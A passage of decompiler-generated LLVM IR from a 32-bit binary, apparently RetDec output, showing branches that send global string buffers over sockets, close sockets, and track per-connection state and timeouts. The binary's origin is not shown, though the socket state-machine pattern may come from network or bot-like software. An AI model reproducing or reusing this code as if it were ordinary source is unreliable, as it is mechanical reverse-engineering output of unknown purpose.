  store i32 %v4_804b098, i32* %v3_804b09e, align 4
  %v1_804b09f = call i32 @sclose(i32 %v2_804b028)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b0ca = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b0ca = inttoptr i32 %v3_804b0ca to i8*
  store i8 1, i8* %v4_804b0ca, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804b0d4:                             ; preds = %dec_label_pc_804a01f
  %v0_804b0d4 = load i32, i32* bitcast ([4 x i8*]* @global_var_8055188.42 to i32*), align 8
  %v5_804b0de = inttoptr i32 %v0_804b0d4 to i8*
  %v1_804b0e4 = and i32 %v0_804b0d4, -256
  store i32 %v1_804b0e4, i32* %eax.global-to-local, align 4
  %v3_804b0ed = call i32 @_strlen(i8* %v5_804b0de)
  store i32 %v3_804b0ed, i32* @ebx, align 4
  %v0_804b0f6 = load i32, i32* bitcast ([4 x i8*]* @global_var_8055188.42 to i32*), align 8
  store i32 %v0_804b0f6, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v2_804b10b = add i32 %v2_804a02b, %v2_8049f6b
  %v3_804b10b = inttoptr i32 %v2_804b10b to i32*
  %v4_804b10b = load i32, i32* %v3_804b10b, align 8
  store i32 %v4_804b10b, i32* %eax.global-to-local, align 4
  %v0_804b10e = load i32, i32* @esp, align 4
  %v1_804b10e = add i32 %v0_804b10e, -4
  %v2_804b10e = inttoptr i32 %v1_804b10e to i32*
  store i32 16384, i32* %v2_804b10e, align 4
  %v0_804b113 = load i32, i32* @ebx, align 4
  %v2_804b113 = add i32 %v0_804b10e, -8
  %v3_804b113 = inttoptr i32 %v2_804b113 to i32*
  store i32 %v0_804b113, i32* %v3_804b113, align 4
  %v0_804b114 = load i32, i32* @esi, align 4
  %v2_804b114 = add i32 %v0_804b10e, -12
  %v3_804b114 = inttoptr i32 %v2_804b114 to i32*
  store i32 %v0_804b114, i32* %v3_804b114, align 4
  %v0_804b115 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b115 = add i32 %v0_804b10e, -16
  %v3_804b115 = inttoptr i32 %v2_804b115 to i32*
  store i32 %v0_804b115, i32* %v3_804b115, align 4
  %v5_804b116 = call i32 @__libc_send(i32 %v0_804b0d4, i32 %stack_var_-240.256, i32 %stack_var_-236.258, i32 %stack_var_-232.260)
  store i32 %v5_804b116, i32* %eax.global-to-local, align 4
  %v2_804b11e = icmp slt i32 %v5_804b116, 0
  %v1_804b120 = icmp eq i1 %v2_804b11e, false
  br i1 %v1_804b120, label %dec_label_pc_804b14f, label %dec_label_pc_804b122

dec_label_pc_804b122:                             ; preds = %dec_label_pc_804b0d4
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b145 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b145 = inttoptr i32 %v3_804b145 to i8*
  store i8 1, i8* %v4_804b145, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804b14f:                             ; preds = %dec_label_pc_804b0d4
  %v0_804b14f = load i32, i32* bitcast ([61 x i8]** @global_var_8055194.43 to i32*), align 4
  %v5_804b159 = inttoptr i32 %v0_804b14f to i8*
  %v1_804b15f = and i32 %v0_804b14f, -256
  store i32 %v1_804b15f, i32* %eax.global-to-local, align 4
  %v3_804b168 = call i32 @_strlen(i8* %v5_804b159)
  store i32 %v3_804b168, i32* @ebx, align 4
  %v0_804b171 = load i32, i32* bitcast ([61 x i8]** @global_var_8055194.43 to i32*), align 4
  store i32 %v0_804b171, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804b186 = load i32, i32* %v3_804b10b, align 8
  store i32 %v4_804b186, i32* %eax.global-to-local, align 4
  %v0_804b189 = load i32, i32* @esp, align 4
  %v1_804b189 = add i32 %v0_804b189, -4
  %v2_804b189 = inttoptr i32 %v1_804b189 to i32*
  store i32 16384, i32* %v2_804b189, align 4
  %v0_804b18e = load i32, i32* @ebx, align 4
  %v2_804b18e = add i32 %v0_804b189, -8
  %v3_804b18e = inttoptr i32 %v2_804b18e to i32*
  store i32 %v0_804b18e, i32* %v3_804b18e, align 4
  %v0_804b18f = load i32, i32* @esi, align 4
  %v2_804b18f = add i32 %v0_804b189, -12
  %v3_804b18f = inttoptr i32 %v2_804b18f to i32*
  store i32 %v0_804b18f, i32* %v3_804b18f, align 4
  %v0_804b190 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b190 = add i32 %v0_804b189, -16
  %v3_804b190 = inttoptr i32 %v2_804b190 to i32*
  store i32 %v0_804b190, i32* %v3_804b190, align 4
  %v6_804b191 = call i32 @__libc_send(i32 %v0_804b14f, i32 %v0_804b0d4, i32 %stack_var_-240.256, i32 %stack_var_-236.258)
  store i32 %v6_804b191, i32* %eax.global-to-local, align 4
  %v2_804b199 = icmp slt i32 %v6_804b191, 0
  %v1_804b19b = icmp eq i1 %v2_804b199, false
  br i1 %v1_804b19b, label %dec_label_pc_804b1ca, label %dec_label_pc_804b19d

dec_label_pc_804b19d:                             ; preds = %dec_label_pc_804b14f
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b1c0 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b1c0 = inttoptr i32 %v3_804b1c0 to i8*
  store i8 1, i8* %v4_804b1c0, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804b1ca:                             ; preds = %dec_label_pc_804b14f
  %v0_804b1ca = load i32, i32* bitcast ([2 x i8*]* @global_var_805518c.44 to i32*), align 4
  %v5_804b1d4 = inttoptr i32 %v0_804b1ca to i8*
  %v1_804b1da = and i32 %v0_804b1ca, -256
  store i32 %v1_804b1da, i32* %eax.global-to-local, align 4
  %v3_804b1e3 = call i32 @_strlen(i8* %v5_804b1d4)
  store i32 %v3_804b1e3, i32* @ebx, align 4
  %v0_804b1ec = load i32, i32* bitcast ([2 x i8*]* @global_var_805518c.44 to i32*), align 4
  store i32 %v0_804b1ec, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804b201 = load i32, i32* %v3_804b10b, align 8
  store i32 %v4_804b201, i32* %eax.global-to-local, align 4
  %v0_804b204 = load i32, i32* @esp, align 4
  %v1_804b204 = add i32 %v0_804b204, -4
  %v2_804b204 = inttoptr i32 %v1_804b204 to i32*
  store i32 16384, i32* %v2_804b204, align 4
  %v0_804b209 = load i32, i32* @ebx, align 4
  %v2_804b209 = add i32 %v0_804b204, -8
  %v3_804b209 = inttoptr i32 %v2_804b209 to i32*
  store i32 %v0_804b209, i32* %v3_804b209, align 4
  %v0_804b20a = load i32, i32* @esi, align 4
  %v2_804b20a = add i32 %v0_804b204, -12
  %v3_804b20a = inttoptr i32 %v2_804b20a to i32*
  store i32 %v0_804b20a, i32* %v3_804b20a, align 4
  %v0_804b20b = load i32, i32* %eax.global-to-local, align 4
  %v2_804b20b = add i32 %v0_804b204, -16
  %v3_804b20b = inttoptr i32 %v2_804b20b to i32*
  store i32 %v0_804b20b, i32* %v3_804b20b, align 4
  %v7_804b20c = call i32 @__libc_send(i32 %v0_804b1ca, i32 %v0_804b14f, i32 %v0_804b0d4, i32 %stack_var_-240.256)
  %v2_804b214 = icmp slt i32 %v7_804b20c, 0
  %v1_804b216 = icmp eq i1 %v2_804b214, false
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804b216, label %dec_label_pc_804b245, label %dec_label_pc_804b218

dec_label_pc_804b218:                             ; preds = %dec_label_pc_804b1ca
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b23b = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b23b = inttoptr i32 %v3_804b23b to i8*
  store i8 1, i8* %v4_804b23b, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804b245:                             ; preds = %dec_label_pc_804b1ca
  store i8 8, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804b25e:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v2_804b26d = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804b26f = add i32 %v2_804b26d, 12
  store i32 %v1_804b26f, i32* %eax.global-to-local, align 4
  %v1_804b272 = inttoptr i32 %v1_804b26f to i32*
  %v2_804b272 = load i32, i32* %v1_804b272, align 4
  store i32 %v2_804b272, i32* %eax.global-to-local, align 4
  %v1_804b274 = icmp eq i32 %v2_804b272, 0
  %v1_804b276 = icmp eq i1 %v1_804b274, false
  br i1 %v1_804b276, label %dec_label_pc_804b29d, label %dec_label_pc_804b278

dec_label_pc_804b278:                             ; preds = %dec_label_pc_804b25e
  store i32 %v1_804a14566, i32* @ebx, align 4
  %v0_804b27b = load i32, i32* @esp, align 4
  %v1_804b27e = add i32 %v0_804b27b, -16
  %v2_804b27e = inttoptr i32 %v1_804b27e to i32*
  store i32 0, i32* %v2_804b27e, align 4
  %v1_804b280 = inttoptr i32 %v6_804a02e to i32*
  %v2_804b280 = call i32 @__GI_time(i32* %v1_804b280)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804b28d = load i32, i32* @ebx, align 4
  %v2_804b293 = mul i32 %v0_804b28d, 24
  %v2_804b296 = add i32 %v2_804b293, %v2_8049f6b
  %v1_804b298 = add i32 %v2_804b296, 12
  store i32 %v1_804b298, i32* %eax.global-to-local, align 4
  %v2_804b29b = inttoptr i32 %v1_804b298 to i32*
  store i32 %v2_804b280, i32* %v2_804b29b, align 4
  br label %dec_label_pc_804b29d

dec_label_pc_804b29d:                             ; preds = %dec_label_pc_804b25e, %dec_label_pc_804b278
  %v0_804b29d = load i32, i32* bitcast ([125 x i8]** @global_var_8055190.45 to i32*), align 16
  %v5_804b2a7 = inttoptr i32 %v0_804b29d to i8*
  %v1_804b2ad = and i32 %v0_804b29d, -256
  store i32 %v1_804b2ad, i32* %eax.global-to-local, align 4
  store i32 %v0_804b29d, i32* @edi, align 4
  %v3_804b2b6 = call i32 @_strlen(i8* %v5_804b2a7)
  store i32 %v3_804b2b6, i32* @ebx, align 4
  %v0_804b2bf = load i32, i32* bitcast ([125 x i8]** @global_var_8055190.45 to i32*), align 16
  store i32 %v0_804b2bf, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b2d4 = inttoptr i32 %v2_804b26d to i32*
  %v4_804b2d4 = load i32, i32* %v3_804b2d4, align 8
  store i32 %v4_804b2d4, i32* %eax.global-to-local, align 4
  %v0_804b2d7 = load i32, i32* @esp, align 4
  %v1_804b2d7 = add i32 %v0_804b2d7, -4
  %v2_804b2d7 = inttoptr i32 %v1_804b2d7 to i32*
  store i32 16384, i32* %v2_804b2d7, align 4
  %v0_804b2dc = load i32, i32* @ebx, align 4
  %v2_804b2dc = add i32 %v0_804b2d7, -8
  %v3_804b2dc = inttoptr i32 %v2_804b2dc to i32*
  store i32 %v0_804b2dc, i32* %v3_804b2dc, align 4
  %v0_804b2dd = load i32, i32* @esi, align 4
  %v2_804b2dd = add i32 %v0_804b2d7, -12
  %v3_804b2dd = inttoptr i32 %v2_804b2dd to i32*
  store i32 %v0_804b2dd, i32* %v3_804b2dd, align 4
  %v0_804b2de = load i32, i32* %eax.global-to-local, align 4
  %v2_804b2de = add i32 %v0_804b2d7, -16
  %v3_804b2de = inttoptr i32 %v2_804b2de to i32*
  store i32 %v0_804b2de, i32* %v3_804b2de, align 4
  %v3_804b2df = ptrtoint i8* %stack_var_-252.250 to i32
  %v5_804b2df = ptrtoint i8* %stack_var_-248.252 to i32
  %v7_804b2df = ptrtoint i8* %stack_var_-244.254 to i32
  %v8_804b2df = call i32 @__libc_send(i32 %v0_804b29d, i32 %v3_804b2df, i32 %v5_804b2df, i32 %v7_804b2df)
  %v0_804b2e4 = load i32, i32* @esp, align 4
  %v2_804b2e7 = icmp slt i32 %v8_804b2df, 0
  %v1_804b2e9 = icmp eq i1 %v2_804b2e7, false
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804b2e9, label %dec_label_pc_804b35f, label %dec_label_pc_804b2eb

dec_label_pc_804b2eb:                             ; preds = %dec_label_pc_804b29d
  %v4_804b2fa = load i32, i32* %v3_804b2d4, align 8
  store i32 %v4_804b2fa, i32* %eax.global-to-local, align 4
  %v3_804b300 = inttoptr i32 %v0_804b2e4 to i32*
  store i32 %v4_804b2fa, i32* %v3_804b300, align 4
  %v2_804b301 = call i32 @sclose(i32 %v0_804b29d)
  store i8 0, i8* %v4_804a02e, align 8
  %v3_804b32c = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b32c = inttoptr i32 %v3_804b32c to i8*
  store i8 1, i8* %v4_804b32c, align 1
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804b342 = add i32 %v2_804b26d, 20
  store i32 %v1_804b342, i32* %eax.global-to-local, align 4
  %v1_804b345 = inttoptr i32 %v1_804b342 to i32*
  %v2_804b345 = load i32, i32* %v1_804b345, align 4
  store i32 %v2_804b345, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804b34e = load i32, i32* @esp, align 4
  %v2_804b351 = add i32 %v0_804b34e, -8
  %v3_804b351 = inttoptr i32 %v2_804b351 to i32*
  store i32 1024, i32* %v3_804b351, align 4
  %v1_804b352 = add i32 %v0_804b34e, -12
  %v2_804b352 = inttoptr i32 %v1_804b352 to i32*
  store i32 0, i32* %v2_804b352, align 4
  %v0_804b354 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b354 = add i32 %v0_804b34e, -16
  %v3_804b354 = inttoptr i32 %v2_804b354 to i32*
  store i32 %v0_804b354, i32* %v3_804b354, align 4
  %v7_804b355 = call i32 @__GI_memset(i8* %v5_804b2a7, i32 %v3_804b2df, i32 %v5_804b2df)
  store i32 %v7_804b355, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804b35f:                             ; preds = %dec_label_pc_804b29d
  store i32 %v1_804b26f, i32* %eax.global-to-local, align 4
  %v2_804b373 = load i32, i32* %v1_804b272, align 4
  store i32 %v2_804b373, i32* %eax.global-to-local, align 4
  %v1_804b375 = add i32 %v2_804b373, 45
  store i32 %v1_804b375, i32* @ebx, align 4
  %v2_804b37b = inttoptr i32 %v0_804b2e4 to i32*
  store i32 0, i32* %v2_804b37b, align 4
  %tmp46 = inttoptr i32 %v0_804b29d to i32*
  %v3_804b37d = call i32 @__GI_time(i32* %tmp46)
  store i32 %v3_804b37d, i32* %eax.global-to-local, align 4
  %v0_804b385 = load i32, i32* @ebx, align 4
  %v7_804b385 = icmp ult i32 %v0_804b385, %v3_804b37d
  %v1_804b387 = icmp eq i1 %v7_804b385, false
  br i1 %v1_804b387, label %dec_label_pc_804b3cf, label %dec_label_pc_804b389

dec_label_pc_804b389:                             ; preds = %dec_label_pc_804b35f
  %v0_804b382 = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804b398 = load i32, i32* %v3_804b2d4, align 8
  store i32 %v4_804b398, i32* %eax.global-to-local, align 4
  %v3_804b39e = inttoptr i32 %v0_804b382 to i32*
  store i32 %v4_804b398, i32* %v3_804b39e, align 4
  %v2_804b39f = call i32 @sclose(i32 %v0_804b29d)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b3ca = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b3ca = inttoptr i32 %v3_804b3ca to i8*
  store i8 1, i8* %v4_804b3ca, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804b3cf:                             ; preds = %dec_label_pc_804a01f, %dec_label_pc_804b35f, %dec_label_pc_804b011, %dec_label_pc_804ab94, %dec_label_pc_804a1cf, %dec_label_pc_804a79c, %dec_label_pc_804a5cd, %dec_label_pc_804b2eb, %dec_label_pc_804b245, %dec_label_pc_804b218, %dec_label_pc_804b19d, %dec_label_pc_804b122, %dec_label_pc_804b089, %dec_label_pc_804afcc, %dec_label_pc_804af55, %dec_label_pc_804aebb, %dec_label_pc_804ad99, %dec_label_pc_804ad4e, %dec_label_pc_804acd8, %dec_label_pc_804ac0c, %dec_label_pc_804ab49, %dec_label_pc_804aa65, %dec_label_pc_804a9a1, %dec_label_pc_804a956, %dec_label_pc_804a4c1, %dec_label_pc_804a315, %dec_label_pc_804a2de, %dec_label_pc_804a1b6, %dec_label_pc_804a8e0, %dec_label_pc_804a814, %dec_label_pc_804a724, %dec_label_pc_804a5fb, %dec_label_pc_804b389
  %stack_var_-252.1 = phi i8* [ %stack_var_-252.250, %dec_label_pc_804a01f ], [ %stack_var_-252.250, %dec_label_pc_804b35f ], [ %stack_var_-252.250, %dec_label_pc_804b389 ], [ %stack_var_-252.250, %dec_label_pc_804b2eb ], [ %v5_804b1d4, %dec_label_pc_804b245 ], [ %v5_804b1d4, %dec_label_pc_804b218 ], [ %stack_var_-252.250, %dec_label_pc_804b19d ], [ %stack_var_-252.250, %dec_label_pc_804b122 ], [ %stack_var_-252.250, %dec_label_pc_804b011 ], [ %stack_var_-252.250, %dec_label_pc_804b089 ], [ %stack_var_-252.250, %dec_label_pc_804afcc ], [ %stack_var_-252.250, %dec_label_pc_804af55 ], [ %stack_var_-252.250, %dec_label_pc_804aebb ], [ %stack_var_-252.250, %dec_label_pc_804ad99 ], [ %stack_var_-252.250, %dec_label_pc_804ad4e ], [ %stack_var_-252.250, %dec_label_pc_804acd8 ], [ %stack_var_-252.250, %dec_label_pc_804ab94 ], [ %stack_var_-252.250, %dec_label_pc_804ac0c ], [ %stack_var_-252.250, %dec_label_pc_804ab49 ], [ %stack_var_-252.250, %dec_label_pc_804aa65 ], [ %stack_var_-252.250, %dec_label_pc_804a9a1 ], [ %stack_var_-252.250, %dec_label_pc_804a956 ], [ %stack_var_-252.250, %dec_label_pc_804a8e0 ], [ %stack_var_-252.250, %dec_label_pc_804a79c ], [ %stack_var_-252.250, %dec_label_pc_804a814 ], [ %stack_var_-252.250, %dec_label_pc_804a724 ], [ %stack_var_-252.250, %dec_label_pc_804a5cd ], [ %stack_var_-252.250, %dec_label_pc_804a5fb ], [ %stack_var_-252.250, %dec_label_pc_804a4c1 ], [ %stack_var_-252.250, %dec_label_pc_804a1cf ], [ %stack_var_-252.250, %dec_label_pc_804a315 ], [ %stack_var_-252.250, %dec_label_pc_804a2de ], [ %stack_var_-252.250, %dec_label_pc_804a1b6 ]
  %stack_var_-248.1 = phi i8* [ %stack_var_-248.252, %dec_label_pc_804a01f ], [ %stack_var_-248.252, %dec_label_pc_804b35f ], [ %stack_var_-248.252, %dec_label_pc_804b389 ], [ %stack_var_-248.252, %dec_label_pc_804b2eb ], [ %v5_804b159, %dec_label_pc_804b245 ], [ %v5_804b159, %dec_label_pc_804b218 ], [ %v5_804b159, %dec_label_pc_804b19d ], [ %stack_var_-248.252, %dec_label_pc_804b122 ], [ %stack_var_-248.252, %dec_label_pc_804b011 ], [ %stack_var_-248.252, %dec_label_pc_804b089 ], [ %stack_var_-248.252, %dec_label_pc_804afcc ], [ %stack_var_-248.252, %dec_label_pc_804af55 ], [ %stack_var_-248.252, %dec_label_pc_804aebb ], [ %stack_var_-248.252, %dec_label_pc_804ad99 ], [ %stack_var_-248.252, %dec_label_pc_804ad4e ], [ %stack_var_-248.252, %dec_label_pc_804acd8 ], [ %stack_var_-248.252, %dec_label_pc_804ab94 ], [ %stack_var_-248.252, %dec_label_pc_804ac0c ], [ %stack_var_-248.252, %dec_label_pc_804ab49 ], [ %stack_var_-248.252, %dec_label_pc_804aa65 ], [ %stack_var_-248.252, %dec_label_pc_804a9a1 ], [ %stack_var_-248.252, %dec_label_pc_804a956 ], [ %stack_var_-248.252, %dec_label_pc_804a8e0 ], [ %stack_var_-248.252, %dec_label_pc_804a79c ], [ %stack_var_-248.252, %dec_label_pc_804a814 ], [ %stack_var_-248.252, %dec_label_pc_804a724 ], [ %stack_var_-248.252, %dec_label_pc_804a5cd ], [ %stack_var_-248.252, %dec_label_pc_804a5fb ], [ %stack_var_-248.252, %dec_label_pc_804a4c1 ], [ %stack_var_-248.252, %dec_label_pc_804a1cf ], [ %stack_var_-248.252, %dec_label_pc_804a315 ], [ %stack_var_-248.252, %dec_label_pc_804a2de ], [ %stack_var_-248.252, %dec_label_pc_804a1b6 ]
  %stack_var_-244.1 = phi i8* [ %stack_var_-244.254, %dec_label_pc_804a01f ], [ %stack_var_-244.254, %dec_label_pc_804b35f ], [ %stack_var_-244.254, %dec_label_pc_804b389 ], [ %stack_var_-244.254, %dec_label_pc_804b2eb ], [ %v5_804b0de, %dec_label_pc_804b245 ], [ %v5_804b0de, %dec_label_pc_804b218 ], [ %v5_804b0de, %dec_label_pc_804b19d ], [ %v5_804b0de, %dec_label_pc_804b122 ], [ %stack_var_-244.254, %dec_label_pc_804b011 ], [ %stack_var_-244.254, %dec_label_pc_804b089 ], [ %stack_var_-244.254, %dec_label_pc_804afcc ], [ %stack_var_-244.254, %dec_label_pc_804af55 ], [ %stack_var_-244.254, %dec_label_pc_804aebb ], [ %stack_var_-244.254, %dec_label_pc_804ad99 ], [ %stack_var_-244.254, %dec_label_pc_804ad4e ], [ %stack_var_-244.254, %dec_label_pc_804acd8 ], [ %stack_var_-244.254, %dec_label_pc_804ab94 ], [ %stack_var_-244.254, %dec_label_pc_804ac0c ], [ %stack_var_-244.254, %dec_label_pc_804ab49 ], [ %stack_var_-244.254, %dec_label_pc_804aa65 ], [ %stack_var_-244.254, %dec_label_pc_804a9a1 ], [ %stack_var_-244.254, %dec_label_pc_804a956 ], [ %stack_var_-244.254, %dec_label_pc_804a8e0 ], [ %stack_var_-244.254, %dec_label_pc_804a79c ], [ %stack_var_-244.254, %dec_label_pc_804a814 ], [ %stack_var_-244.254, %dec_label_pc_804a724 ], [ %stack_var_-244.254, %dec_label_pc_804a5cd ], [ %stack_var_-244.254, %dec_label_pc_804a5fb ], [ %stack_var_-244.254, %dec_label_pc_804a4c1 ], [ %stack_var_-244.254, %dec_label_pc_804a1cf ], [ %stack_var_-244.254, %dec_label_pc_804a315 ], [ %stack_var_-244.254, %dec_label_pc_804a2de ], [ %stack_var_-244.254, %dec_label_pc_804a1b6 ]
  %stack_var_-240.1 = phi i32 [ %stack_var_-240.256, %dec_label_pc_804a01f ], [ %stack_var_-240.256, %dec_label_pc_804b35f ], [ %stack_var_-240.256, %dec_label_pc_804b389 ], [ %stack_var_-240.256, %dec_label_pc_804b2eb ], [ %stack_var_-240.256, %dec_label_pc_804b245 ], [ %stack_var_-240.256, %dec_label_pc_804b218 ], [ %stack_var_-240.256, %dec_label_pc_804b19d ], [ %stack_var_-240.256, %dec_label_pc_804b122 ], [ %v2_804b028, %dec_label_pc_804b011 ], [ %v2_804b028, %dec_label_pc_804b089 ], [ %stack_var_-240.256, %dec_label_pc_804afcc ], [ %stack_var_-240.256, %dec_label_pc_804af55 ], [ %stack_var_-240.256, %dec_label_pc_804aebb ], [ %stack_var_-240.256, %dec_label_pc_804ad99 ], [ %stack_var_-240.256, %dec_label_pc_804ad4e ], [ %stack_var_-240.256, %dec_label_pc_804acd8 ], [ %stack_var_-240.256, %dec_label_pc_804ab94 ], [ %stack_var_-240.256, %dec_label_pc_804ac0c ], [ %stack_var_-240.256, %dec_label_pc_804ab49 ], [ %stack_var_-240.256, %dec_label_pc_804aa65 ], [ %stack_var_-240.256, %dec_label_pc_804a9a1 ], [ %stack_var_-240.256, %dec_label_pc_804a956 ], [ %stack_var_-240.256, %dec_label_pc_804a8e0 ], [ %stack_var_-240.256, %dec_label_pc_804a79c ], [ %stack_var_-240.256, %dec_label_pc_804a814 ], [ %stack_var_-240.256, %dec_label_pc_804a724 ], [ %stack_var_-240.256, %dec_label_pc_804a5cd ], [ %stack_var_-240.256, %dec_label_pc_804a5fb ], [ %stack_var_-240.256, %dec_label_pc_804a4c1 ], [ %stack_var_-240.256, %dec_label_pc_804a1cf ], [ %stack_var_-240.256, %dec_label_pc_804a315 ], [ %stack_var_-240.256, %dec_label_pc_804a2de ], [ %stack_var_-240.256, %dec_label_pc_804a1b6 ]
  %stack_var_-236.1 = phi i32 [ %stack_var_-236.258, %dec_label_pc_804a01f ], [ %stack_var_-236.258, %dec_label_pc_804b35f ], [ %stack_var_-236.258, %dec_label_pc_804b389 ], [ %stack_var_-236.258, %dec_label_pc_804b2eb ], [ %stack_var_-236.258, %dec_label_pc_804b245 ], [ %stack_var_-236.258, %dec_label_pc_804b218 ], [ %stack_var_-236.258, %dec_label_pc_804b19d ], [ %stack_var_-236.258, %dec_label_pc_804b122 ], [ %stack_var_-236.258, %dec_label_pc_804b011 ], [ %stack_var_-236.258, %dec_label_pc_804b089 ], [ %stack_var_-236.258, %dec_label_pc_804afcc ], [ %stack_var_-236.258, %dec_label_pc_804af55 ], [ %stack_var_-236.258, %dec_label_pc_804aebb ], [ %v4_804ac6f, %dec_label_pc_804ad99 ], [ %v4_804ac6f, %dec_label_pc_804ad4e ], [ %v4_804ac6f, %dec_label_pc_804acd8 ], [ %stack_var_-236.258, %dec_label_pc_804ab94 ], [ %stack_var_-236.258, %dec_label_pc_804ac0c ], [ %stack_var_-236.258, %dec_label_pc_804ab49 ], [ %stack_var_-236.258, %dec_label_pc_804aa65 ], [ %stack_var_-236.258, %dec_label_pc_804a9a1 ], [ %stack_var_-236.258, %dec_label_pc_804a956 ], [ %stack_var_-236.258, %dec_label_pc_804a8e0 ], [ %stack_var_-236.258, %dec_label_pc_804a79c ], [ %stack_var_-236.258, %dec_label_pc_804a814 ], [ %stack_var_-236.258, %dec_label_pc_804a724 ], [ %stack_var_-236.258, %dec_label_pc_804a5cd ], [ %stack_var_-236.258, %dec_label_pc_804a5fb ], [ %stack_var_-236.258, %dec_label_pc_804a4c1 ], [ %stack_var_-236.258, %dec_label_pc_804a1cf ], [ %stack_var_-236.258, %dec_label_pc_804a315 ], [ %stack_var_-236.258, %dec_label_pc_804a2de ], [ %stack_var_-236.258, %dec_label_pc_804a1b6 ]
  %stack_var_-232.1 = phi i32 [ %stack_var_-232.260, %dec_label_pc_804a01f ], [ %stack_var_-232.260, %dec_label_pc_804b35f ], [ %stack_var_-232.260, %dec_label_pc_804b389 ], [ %stack_var_-232.260, %dec_label_pc_804b2eb ], [ %stack_var_-232.260, %dec_label_pc_804b245 ], [ %stack_var_-232.260, %dec_label_pc_804b218 ], [ %stack_var_-232.260, %dec_label_pc_804b19d ], [ %stack_var_-232.260, %dec_label_pc_804b122 ], [ %stack_var_-232.260, %dec_label_pc_804b011 ], [ %stack_var_-232.260, %dec_label_pc_804b089 ], [ %stack_var_-232.260, %dec_label_pc_804afcc ], [ %stack_var_-232.260, %dec_label_pc_804af55 ], [ %stack_var_-232.260, %dec_label_pc_804aebb ], [ %stack_var_-232.260, %dec_label_pc_804ad99 ], [ %stack_var_-232.260, %dec_label_pc_804ad4e ], [ %stack_var_-232.260, %dec_label_pc_804acd8 ], [ %v2_804abab, %dec_label_pc_804ab94 ], [ %v2_804abab, %dec_label_pc_804ac0c ], [ %stack_var_-232.260, %dec_label_pc_804ab49 ], [ %stack_var_-232.260, %dec_label_pc_804aa65 ], [ %stack_var_-232.260, %dec_label_pc_804a9a1 ], [ %stack_var_-232.260, %dec_label_pc_804a956 ], [ %stack_var_-232.260, %dec_label_pc_804a8e0 ], [ %stack_var_-232.260, %dec_label_pc_804a79c ], [ %stack_var_-232.260, %dec_label_pc_804a814 ], [ %stack_var_-232.260, %dec_label_pc_804a724 ], [ %stack_var_-232.260, %dec_label_pc_804a5cd ], [ %stack_var_-232.260, %dec_label_pc_804a5fb ], [ %stack_var_-232.260, %dec_label_pc_804a4c1 ], [ %stack_var_-232.260, %dec_label_pc_804a1cf ], [ %stack_var_-232.260, %dec_label_pc_804a315 ], [ %stack_var_-232.260, %dec_label_pc_804a2de ], [ %stack_var_-232.260, %dec_label_pc_804a1b6 ]
